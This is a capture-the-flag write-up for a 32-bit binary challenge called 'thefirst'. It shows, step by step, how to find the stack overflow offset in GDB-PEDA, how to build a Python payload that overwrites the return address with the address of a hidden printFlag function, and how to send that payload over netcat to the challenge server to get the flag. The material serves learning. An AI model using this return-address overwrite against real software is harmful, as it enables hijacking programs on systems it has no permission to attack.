# thefirst
## PWN 32bits binary

**Using**:
- Linux
- GDB-PEDA

The programme start with the phrase : *Let's see what you can do*
We are able to write something but the programme exit after that.

First step, strings the binary:
- `$ strings thefirst`

We can now see all the function used for (nope there is no flag here).
There is an interesting function called **printFlag**.
This function is never called during the *normal* execution of the programme.
We'll try to call this function.

We can see a segmentation fault if we enter too much characters, let's try a bufferoverflow.

**We place two breakpoints** :
- 0x08049276 <+87>:	call   0x80490a0 <gets@plt>
- `gdb-peda$ b*0x08049276`

- 0x08049286 <+103>:	leave
- `gdb-peda$ b*0x08049286`

**Run and continue to pass the first breakpoint** :
- `gdb-peda$ run`
- ̀`gdb-peda$ c`

Now we can enter our pattern [following this link](https://wiremask.eu/tools/buffer-overflow-pattern-generator/)

There is our 50 lengh pattern that we put on the program:
- Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab

Pass the last breakpoint :
- `gdb-peda$ c`

We are at the end of the program, we can see the ESP and EIP stack.
The EIP stack is full of characters that are on our pattern, let's see which one !
- EIP: 0x41386141 ('Aa8A')

- Pattern Offset : *0x41386141*
- Lengh : *24*

The EIP is full after 24 chars, let's try another test.
Now we add 'ABCD' at the end of our 24 lengh pattern:
- Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7ABCD

**We do the same thing and then**:
- EIP: 0x44434241 ('ABCD')

Now the fun begins !

We need the address memory of printFlag:
- `gdb-peda$ p printFlag`
- 1 = {<text variable, no debug info>} 0x80491f6 <printFlag>

- printFlag : *0x80491f6*

Now we are going to make our exploit with all those information.
- 24 chars + printFlag_mem
- `$ python -c 'print "A" * 24+"\x08\x04\x91\xf6"[::-1]' | ./thefirst`

We got the message :
- */bin/cat ./flag.txt don't exist*

We did it, now let's try this exloit on the Netcat of the challenge.
- `$ $python -c 'print "A" * 24+"\x08\x04\x91\xf6"[::-1]+"\n"' | nc chal.tuctf.com 30508`
- **TUCTF{0n3_d0wn..._50_m4ny_70_60}**
